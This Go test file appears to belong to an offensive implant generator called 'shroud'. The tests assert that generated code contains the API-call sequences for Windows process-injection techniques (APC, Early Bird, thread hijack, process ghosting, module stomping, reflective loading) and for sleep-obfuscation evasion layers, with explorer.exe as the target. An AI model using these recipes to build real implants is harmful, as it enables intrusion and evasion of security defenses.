// technique_bodies_test.go — compile-correctness + content-marker tests for the
// Phase E techniques (pe11 APC, pe12 Early Bird, pe15 thread hijack, pe22 fibers).
//
// These tests validate that Assemble emits syntactically valid Go (parsed with
// go/parser) containing the expected API-call sequence markers and DJB2 hash
// consts for each technique. They do NOT execute the implant (the generator never
// executes output). A real Windows cross-compile (`GOOS=windows go build`) is
// available behind SHROUD_COMPILE_TEST=1 so the fast `go test ./...` path stays
// quick; the manual/CI verification step opts in.
package payload

import (
	"go/parser"
	"go/token"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"shroud/internal/catalog"
	"shroud/internal/evasion"
)

// newSpec builds an Assemble Spec for the given technique with the dynamic-api
// evasion layer and a small demo payload, writing to a temp dir.
func newSpec(t *testing.T, id string) *Spec {
	t.Helper()
	tech := catalog.ByID(id)
	if tech == nil {
		t.Fatalf("catalog.ByID(%q): not found", id)
	}
	if !tech.Implemented {
		t.Fatalf("%s: catalog marks Implemented=false; test only covers code-generated techniques", id)
	}
	return &Spec{
		Tech:       tech,
		Layers:     []evasion.Layer{evasion.LayerDynamicAPI},
		Format:     "exe",
		OutDir:     t.TempDir(),
		EncPayload: []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0xcc, 0xcc, 0xc3},
		Process:    "explorer.exe",
	}
}

// assembleMainGo runs Assemble, reads + parses the emitted main.go, and returns
// its source. Fails the test on any assemble/write/parse error.
func assembleMainGo(t *testing.T, id string) string {
	t.Helper()
	spec := newSpec(t, id)
	if err := Assemble(spec); err != nil {
		t.Fatalf("Assemble(%s): %v", id, err)
	}
	src, err := os.ReadFile(filepath.Join(spec.OutDir, "main.go"))
	if err != nil {
		t.Fatalf("read main.go: %v", err)
	}
	fset := token.NewFileSet()
	if _, err := parser.ParseFile(fset, "main.go", src, parser.AllErrors); err != nil {
		t.Fatalf("%s: emitted main.go does not parse: %v", id, err)
	}
	return string(src)
}

// want asserts every marker is present in src; reports all missing markers.
func want(t *testing.T, id, src string, markers ...string) {
	t.Helper()
	var missing []string
	for _, m := range markers {
		if !strings.Contains(src, m) {
			missing = append(missing, m)
		}
	}
	if len(missing) > 0 {
		t.Errorf("%s: emitted main.go missing markers: %v", id, missing)
	}
}

func TestPe11Body(t *testing.T) {
	src := assembleMainGo(t, "pe11")
	want(t, "pe11", src,
		"func pe11APCInject(pid uint32, payload []byte)",
		"wincall.CallG0(hQueueUserAPC", // queue the shellcode as an APC
		"wincall.CallG0(hOpenThread",   // open a target thread
		"wincall.CallG0(hVirtualProtectEx",
		"threadIDByPID(pid)",
		"hQueueUserAPC",  // const declaration
		"hVirtualProtectEx",
	)
}

func TestPe12Body(t *testing.T) {
	src := assembleMainGo(t, "pe12")
	want(t, "pe12", src,
		"func pe12EarlyBird(payload []byte)",
		"wincall.CallG0(hCreateProcessW", // spawn suspended sacrificial process
		"wincall.CallG0(hQueueUserAPC",   // APC onto the fresh main thread
		"wincall.CallG0(hResumeThread",   // resume -> APC fires before entry
		"wincall.CallG0(hVirtualProtectEx",
		"uintptr(0x4)", // CREATE_SUSPENDED
		"hCreateProcessW",
		"hQueueUserAPC",
	)
}

func TestPe15Body(t *testing.T) {
	src := assembleMainGo(t, "pe15")
	want(t, "pe15", src,
		"func pe15Hijack(pid uint32, payload []byte)",
		"wincall.CallG0(hSuspendThread",
		"wincall.CallG0(hGetThreadContext",
		"wincall.CallG0(hSetThreadContext",
		"wincall.CallG0(hResumeThread",
		"ctx15RipOffset", // CONTEXT.Rip offset const
		"ctx15Amd64Size",
		"threadIDByPID(pid)",
		"hSuspendThread",
		"hSetThreadContext",
	)
}

func TestPe22Body(t *testing.T) {
	src := assembleMainGo(t, "pe22")
	want(t, "pe22", src,
		"func pe22Fibers(addr uintptr)",
		"wincall.CallG0(hConvertThreadToFiber",
		"wincall.CallG0(hCreateFiber",
		"wincall.CallG0(hSwitchToFiber",
		"hConvertThreadToFiber",
		"hCreateFiber",
		"hSwitchToFiber",
	)
}

// TestPe14Body — Process Ghosting: the body must encode the full NT ghosting
// sequence (NtCreateFile + NtWriteFile + NtSetInformationFile + NtCreateSection
// + NtClose + NtCreateProcessEx) plus the shellcode-stage + NtCreateThreadEx, and
// declare the pe14-local NT structs. EXPERIMENTAL technique — compile-correctness
// gate only (on-target runtime verification is separate).
func TestPe14Body(t *testing.T) {
	src := assembleMainGo(t, "pe14")
	want(t, "pe14", src,
		"func pe14Ghost(payload []byte)",
		"wincall.CallG0(hNtCreateFile",          // open ghost temp file
		"wincall.CallG0(hNtWriteFile",          // write the sacrificial PE
		"wincall.CallG0(hNtSetInformationFile", // mark delete-pending
		"wincall.CallG0(hNtCreateSection",      // SEC_IMAGE from the delete-pending file
		"wincall.CallG0(hNtCreateProcessEx",    // spawn from the fileless section
		"wincall.CallG0(hNtCreateThreadEx",     // run shellcode in the ghosted process
		"wincall.CallG0(hVirtualAllocEx",
		"wincall.CallG0(hWriteProcessMemory",
		"buildGhostPath14(tmpBuf[:])",
		"type unicodeString14 struct",
		"type objAttrs14 struct",
		"type ioStatusBlock14 struct",
		"type fileDispInfo14 struct",
		"hNtCreateFile",
		"hNtCreateProcessEx",
		"hNtCreateSection",
	)
}

// TestPe21Body — Dirty Vanity: stage shellcode in self, fork with
// RtlCreateProcessReflection, NtCreateThreadEx in the child at the inherited
// address. EXPERIMENTAL technique — compile-correctness gate only.
func TestPe21Body(t *testing.T) {
	src := assembleMainGo(t, "pe21")
	want(t, "pe21", src,
		"func pe21DirtyVanity(addr uintptr)",
		"wincall.CallG0(hRtlCreateProcessReflection", // fork the current process
		"wincall.CallG0(hNtCreateThreadEx",           // run shellcode in the child
		"ri.ChildProc",
		"type reflInfo21 struct",
		"hRtlCreateProcessReflection",
		"hNtCreateThreadEx",
	)
}

// TestPe13Body — RWX hunting: VirtualQueryEx scan for a committed RWX region +
// WriteProcessMemory + CreateRemoteThread. Fully code-generated.
func TestPe13Body(t *testing.T) {
	src := assembleMainGo(t, "pe13")
	want(t, "pe13", src,
		"func pe13RWXHunt(pid uint32, payload []byte)",
		"wincall.CallG0(hVirtualQueryEx",
		"wincall.CallG0(hWriteProcessMemory",
		"wincall.CallG0(hCreateRemoteThread",
		"type memBasicInfo13 struct",
		"mbi.Protect == 0x40", // PAGE_EXECUTE_READWRITE
		"mbi.State == 0x1000", // MEM_COMMIT
		"hVirtualQueryEx",
		"hCreateRemoteThread",
	)
}

// TestPe10Body — AddressOfEntryPoint: module snapshot + RPM PE headers + WPM into
// the RX entry region + CreateRemoteThread. Fully code-generated.
func TestPe10Body(t *testing.T) {
	src := assembleMainGo(t, "pe10")
	want(t, "pe10", src,
		"func pe10EntryInject(pid uint32, payload []byte)",
		"wincall.CallG0(hReadProcessMemory",
		"wincall.CallG0(hWriteProcessMemory",
		"wincall.CallG0(hCreateRemoteThread",
		"moduleBaseByPID(pid, ",
		"uintptr(0x3c)",       // e_lfanew offset
		"uintptr(0x28)",       // AddressOfEntryPoint offset
		"hReadProcessMemory",
	)
}

// TestPe16Body — module stomping (remote): force-load DLL via remote
// LoadLibraryA thread, locate base via module snapshot, read .text bounds, flip
// RW -> stomp -> RX, CreateRemoteThread. Fully code-generated.
func TestPe16Body(t *testing.T) {
	src := assembleMainGo(t, "pe16")
	want(t, "pe16", src,
		"func pe16Stomp(pid uint32, payload []byte)",
		"wincall.CallG0(hVirtualAllocEx",
		"wincall.CallG0(hCreateRemoteThread",
		"wincall.CallG0(hVirtualProtectEx",
		"wincall.CallG0(hWriteProcessMemory",
		"api(hKernel32Dll, hLoadLibraryA)",
		"moduleBaseByPID(pid, ",
		"uintptr(0x04)", // PAGE_READWRITE (flip)
		"uintptr(0x20)", // PAGE_EXECUTE_READ (flip back)
		"hVirtualProtectEx",
		"hLoadLibraryA",
	)
}

// TestPe19Body — section mapping: NtCreateSection + NtMapViewOfSection (self +
// target) + NtCreateThreadEx, no cross-process WPM. Fully code-generated.
func TestPe19Body(t *testing.T) {
	src := assembleMainGo(t, "pe19")
	want(t, "pe19", src,
		"func pe19Section(pid uint32, payload []byte)",
		"wincall.CallG0(hNtOpenProcess",
		"wincall.CallG0(hNtCreateSection",
		"wincall.CallG0(hNtMapViewOfSection",
		"wincall.CallG0(hNtCreateThreadEx",
		"wincall.CallG0(hGetCurrentProcess",
		"uintptr(0x8000000)", // SEC_COMMIT
		"uintptr(0x40)",      // PAGE_EXECUTE_READWRITE (section)
		"hNtMapViewOfSection",
		"hNtCreateSection",
	)
	// no cross-process WriteProcessMemory in the section-mapping path
	if strings.Contains(src, "hWriteProcessMemory") {
		t.Error("pe19: WriteProcessMemory present (section mapping must not use WPM)")
	}
}

// TestPe06Body — reflective DLL injection (manual map): manualMapPE +
// CreateRemoteThread(DllMain, base). EXPERIMENTAL — compile-correctness gate.
func TestPe06Body(t *testing.T) {
	src := assembleMainGo(t, "pe06")
	want(t, "pe06", src,
		"func pe06Reflective(pid uint32, payload []byte)",
		"manualMapPE(h, payload)",
		"wincall.CallG0(hOpenProcess",
		"wincall.CallG0(hCreateRemoteThread",
		"func manualMapPE(h uintptr, p []byte) mapResult",
		"func rvaToOff(p []byte, rva uint32) uint32",
		"api(hKernel32Dll, hLoadLibraryA)",
		"api(hKernel32Dll, hGetProcAddress)",
		"typ == 10",          // IMAGE_REL_BASED_DIR64
		"mr.entry, mr.base",  // DllMain called with hinstDLL=base
		"hGetProcAddress",
	)
}

// TestPe09Body — whole-PE injection (manual map): manualMapPE +
// CreateRemoteThread(entry). EXPERIMENTAL — compile-correctness gate.
func TestPe09Body(t *testing.T) {
	src := assembleMainGo(t, "pe09")
	want(t, "pe09", src,
		"func pe09WholePE(pid uint32, payload []byte)",
		"manualMapPE(h, payload)",
		"wincall.CallG0(hOpenProcess",
		"wincall.CallG0(hCreateRemoteThread",
		"func manualMapPE(h uintptr, p []byte) mapResult",
		"mr.entry, uintptr(0)", // EXE entry called with no param
		"hVirtualAllocEx",
		"hVirtualProtectEx",
	)
}

// TestPe20Body — Mokingjay: LoadLibraryA vulnerable DLL + VirtualQuery scan for
// RWX + write shellcode + local CreateThread. EXPERIMENTAL — compile gate.
func TestPe20Body(t *testing.T) {
	src := assembleMainGo(t, "pe20")
	want(t, "pe20", src,
		"func pe20Mokingjay(payload []byte) uintptr",
		"wincall.CallG0(hVirtualQuery",
		"wincall.CallG0(hCreateThread",
		"api(hKernel32Dll, hLoadLibraryA)",
		"type memBasicInfo20 struct",
		"mbi.Protect == 0x40",
		"mbi.AllocationBase != dllBase",
		"hVirtualQuery",
		"hLoadLibraryA",
	)
}

// TestPe07Alias — pe07 is a "via layer" alias of the unhook layer applied to a
// local inject. It must emit a working local inject (localStage) and dispatch via
// localRun (not a scaffold).
func TestPe07Alias(t *testing.T) {
	src := assembleMainGo(t, "pe07")
	want(t, "pe07", src,
		"func run()",
		"func localStage(payload []byte) uintptr",
		"wincall.CallG0(hVirtualAlloc",
	)
	if strings.Contains(src, "scaffold") {
		t.Error("pe07: emitted a scaffold (should be a working local inject alias)")
	}
}

// TestPe17Pe18Alias — pe17/pe18 are "via layer" aliases of pe02 (PEB walk =
// dynamic-api, universal in the Go rewrite). They must emit the pe02 body.
func TestPe17Pe18Alias(t *testing.T) {
	for _, id := range []string{"pe17", "pe18"} {
		src := assembleMainGo(t, id)
		want(t, id, src,
			"func pe02Inject(pid uint32, payload []byte)",
			"wincall.CallG0(hCreateRemoteThread",
			"wincall.CallG0(hVirtualAllocEx",
			"wincall.CallG0(hWriteProcessMemory",
		)
		if strings.Contains(src, "scaffold") {
			t.Errorf("%s: emitted a scaffold (should be the pe02 body alias)", id)
		}
	}
}

// TestNewTechniquesCrossCompile optionally cross-compiles each new technique to a
// Windows EXE (GOOS=windows GOARCH=amd64 CGO_ENABLED=0) to confirm the emitted
// project builds. Gated behind SHROUD_COMPILE_TEST=1 because it shells out `go
// build` (slow); the parser+marker tests above are the always-on gate.
func TestNewTechniquesCrossCompile(t *testing.T) {
	if os.Getenv("SHROUD_COMPILE_TEST") != "1" {
		t.Skip("set SHROUD_COMPILE_TEST=1 to run the Windows cross-compile check")
	}
	for _, id := range []string{"pe11", "pe12", "pe14", "pe15", "pe21", "pe22",
		"pe06", "pe09", "pe10", "pe13", "pe16", "pe19", "pe20",
		"pe07", "pe17", "pe18"} {
		t.Run(id, func(t *testing.T) {
			spec := newSpec(t, id)
			if err := Assemble(spec); err != nil {
				t.Fatalf("Assemble: %v", err)
			}
			env := append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
			// The emitted project ships an empty go.sum seed; build.sh runs
			// `go mod tidy` first to populate the go-wincall entry. Replicate
			// that here (the module is in the local cache, so this is offline).
			tidy := exec.Command("go", "mod", "tidy")
			tidy.Dir = spec.OutDir
			tidy.Env = env
			if out, err := tidy.CombinedOutput(); err != nil {
				t.Fatalf("%s go mod tidy failed: %v\n%s", id, err, out)
			}
			cmd := exec.Command("go", "build", "-o", filepath.Join(spec.OutDir, "implant.exe"), ".")
			cmd.Dir = spec.OutDir
			cmd.Env = env
			if out, err := cmd.CombinedOutput(); err != nil {
				t.Fatalf("%s cross-compile failed: %v\n%s", id, err, out)
			}
		})
	}
}

// sleepSpec builds a Spec with the sleep layer armed and a demo SleepMS, for the
// sleep-evasion tests. Uses pe26 (the modern loader) as the carrier technique —
// the sleep demo overrides the technique body, so the carrier choice only affects
// staging (localStage vs moduleStomp); pe26 + dynamic-api gives a clean baseline.
func sleepSpec(t *testing.T) *Spec {
	t.Helper()
	tech := catalog.ByID("pe26")
	if tech == nil {
		t.Fatalf("catalog.ByID(pe26): not found")
	}
	return &Spec{
		Tech:       tech,
		Layers:     []evasion.Layer{evasion.LayerDynamicAPI, evasion.LayerSleep},
		Format:     "exe",
		OutDir:     t.TempDir(),
		EncPayload: []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0xcc, 0xcc, 0xc3},
		Process:    "explorer.exe",
		SleepMS:    30000, // 30s demo loop
	}
}

// TestSleepBody asserts the sleep demo path emits sleepScramble + sleepLoop with the
// expected Win32 API consts (VirtualProtect, Sleep, FlushInstructionCache) and the
// numeric-encoded sleep key, and that the emitted main.go parses as valid Go.
func TestSleepBody(t *testing.T) {
	spec := sleepSpec(t)
	if err := Assemble(spec); err != nil {
		t.Fatalf("Assemble: %v", err)
	}
	src, err := os.ReadFile(filepath.Join(spec.OutDir, "main.go"))
	if err != nil {
		t.Fatalf("read main.go: %v", err)
	}
	s := string(src)
	// must parse as valid Go
	fset := token.NewFileSet()
	if _, err := parser.ParseFile(fset, "main.go", s, parser.AllErrors); err != nil {
		t.Fatalf("sleep main.go does not parse: %v", err)
	}
	want(t, "sleep", s,
		"func sleepScramble(addr uintptr, n int, ms uint32)",
		"func sleepLoop(addr uintptr, n int, ms uint32)",
		"var sleepKey = []byte(", // numeric-encoded key
		"wincall.CallG0(hVirtualProtect",
		"wincall.CallG0(hSleep",
		"wincall.CallG0(hFlushInstructionCache",
		"hVirtualProtect",       // const declaration
		"hSleep",                 // const declaration
		"hFlushInstructionCache", // const declaration
		"sleepLoop(addr, len(payload)", // demo run() drives the loop
		// the numeric key bytes (first byte 0x5a = g_skey[0]) must be present
		"0x5a",
	)
	// the technique body must NOT be emitted (sleep demo overrides it): pe26's
	// normal run() composes staging + execCallback/execThread; the sleep demo emits
	// sleepLoop instead. Assert the sleep-loop call is present and the classic
	// execute path is absent.
	if !strings.Contains(s, "sleepLoop(addr, len(payload)") {
		t.Error("sleep: demo run() does not call sleepLoop")
	}
}

// TestSleepHelperOnlyArmedWithLayer asserts sleepHelper() is a no-op (returns "") when
// the sleep layer is NOT active — so a normal build never emits the sleep primitive.
func TestSleepHelperOnlyArmedWithLayer(t *testing.T) {
	tech := catalog.ByID("pe26")
	spec := &Spec{
		Tech:       tech,
		Layers:     []evasion.Layer{evasion.LayerDynamicAPI}, // no sleep
		Format:     "exe",
		OutDir:     t.TempDir(),
		EncPayload: []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0xcc, 0xcc, 0xc3},
		Process:    "explorer.exe",
	}
	if err := Assemble(spec); err != nil {
		t.Fatalf("Assemble: %v", err)
	}
	src, err := os.ReadFile(filepath.Join(spec.OutDir, "main.go"))
	if err != nil {
		t.Fatalf("read main.go: %v", err)
	}
	if strings.Contains(string(src), "sleepScramble") {
		t.Error("sleepScramble emitted without -e sleep (helper should be unarmed)")
	}
	if strings.Contains(string(src), "hSleep") {
		t.Error("hSleep const emitted without -e sleep")
	}
}

// ekkoSleepSpec builds a Spec with the sleep layer armed, a demo SleepMS, and the
// tier-2 Ekko scheme selected, for the Ekko sleep-evasion test.
func ekkoSleepSpec(t *testing.T) *Spec {
	t.Helper()
	tech := catalog.ByID("pe26")
	if tech == nil {
		t.Fatalf("catalog.ByID(pe26): not found")
	}
	return &Spec{
		Tech:        tech,
		Layers:      []evasion.Layer{evasion.LayerDynamicAPI, evasion.LayerSleep},
		Format:      "exe",
		OutDir:      t.TempDir(),
		EncPayload:  []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0xcc, 0xcc, 0xc3},
		Process:     "explorer.exe",
		SleepMS:     30000, // 30s demo
		SleepScheme: "ekko",
	}
}

// TestEkkoSleepBody asserts the tier-2 Ekko scheme emits ekkoSleep + ekkoTimerCb
// with the expected timer/callback API consts (CreateEventW, CreateTimerQueueTimer,
// WaitForSingleObject, SetEvent, VirtualProtect, Sleep, FlushInstructionCache,
// CloseHandle), the NewCallback bridge, the ekkoCtx struct, and that the emitted
// main.go parses as valid Go. EXPERIMENTAL — compile-correctness gate only.
func TestEkkoSleepBody(t *testing.T) {
	spec := ekkoSleepSpec(t)
	if err := Assemble(spec); err != nil {
		t.Fatalf("Assemble: %v", err)
	}
	src, err := os.ReadFile(filepath.Join(spec.OutDir, "main.go"))
	if err != nil {
		t.Fatalf("read main.go: %v", err)
	}
	s := string(src)
	fset := token.NewFileSet()
	if _, err := parser.ParseFile(fset, "main.go", s, parser.AllErrors); err != nil {
		t.Fatalf("ekko main.go does not parse: %v", err)
	}
	want(t, "ekko", s,
		"func ekkoSleep(addr uintptr, n int, ms uint32)",
		"func ekkoTimerCb(args unsafe.Pointer) uintptr",
		"wincall.NewCallback(ekkoTimerCb)",
		"wincall.CallG0(hCreateEventW",
		"wincall.CallG0(hCreateTimerQueueTimer",
		"wincall.CallG0(hWaitForSingleObject",
		"wincall.CallG0(hSetEvent",
		"wincall.CallG0(hVirtualProtect",
		"wincall.CallG0(hFlushInstructionCache",
		"wincall.CallG0(hCloseHandle",
		"type ekkoCtxT struct",
		"ekkoCtx.Event",
		"ekkoSleep(addr, len(payload)", // demo run() drives ekkoSleep
		"hCreateEventW",               // const declaration
		"hCreateTimerQueueTimer",
		"hWaitForSingleObject",
		"hSetEvent",
		"hCloseHandle",
		"0x04",   // PAGE_READWRITE
	)
	// the tier-1 loop driver must NOT be emitted under the ekko scheme
	if strings.Contains(s, "func sleepLoop(") {
		t.Error("ekko: tier-1 sleepLoop emitted under --sleep-scheme ekko")
	}
}

// TestEkkoSleepCrossCompile optionally cross-compiles an ekko-armed build to a
// Windows EXE to confirm the emitted project (with the NewCallback bridge) builds.
// Gated behind SHROUD_COMPILE_TEST=1.
func TestEkkoSleepCrossCompile(t *testing.T) {
	if os.Getenv("SHROUD_COMPILE_TEST") != "1" {
		t.Skip("set SHROUD_COMPILE_TEST=1 to run the Windows cross-compile check")
	}
	spec := ekkoSleepSpec(t)
	if err := Assemble(spec); err != nil {
		t.Fatalf("Assemble: %v", err)
	}
	env := append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	tidy := exec.Command("go", "mod", "tidy")
	tidy.Dir = spec.OutDir
	tidy.Env = env
	if out, err := tidy.CombinedOutput(); err != nil {
		t.Fatalf("ekko go mod tidy failed: %v\n%s", err, out)
	}
	cmd := exec.Command("go", "build", "-o", filepath.Join(spec.OutDir, "implant.exe"), ".")
	cmd.Dir = spec.OutDir
	cmd.Env = env
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("ekko cross-compile failed: %v\n%s", err, out)
	}
}

// TestSleepCrossCompile optionally cross-compiles a sleep-armed build to a Windows
// EXE to confirm the emitted project builds. Gated behind SHROUD_COMPILE_TEST=1.
func TestSleepCrossCompile(t *testing.T) {
	if os.Getenv("SHROUD_COMPILE_TEST") != "1" {
		t.Skip("set SHROUD_COMPILE_TEST=1 to run the Windows cross-compile check")
	}
	spec := sleepSpec(t)
	if err := Assemble(spec); err != nil {
		t.Fatalf("Assemble: %v", err)
	}
	env := append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	tidy := exec.Command("go", "mod", "tidy")
	tidy.Dir = spec.OutDir
	tidy.Env = env
	if out, err := tidy.CombinedOutput(); err != nil {
		t.Fatalf("sleep go mod tidy failed: %v\n%s", err, out)
	}
	cmd := exec.Command("go", "build", "-o", filepath.Join(spec.OutDir, "implant.exe"), ".")
	cmd.Dir = spec.OutDir
	cmd.Env = env
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("sleep cross-compile failed: %v\n%s", err, out)
	}
}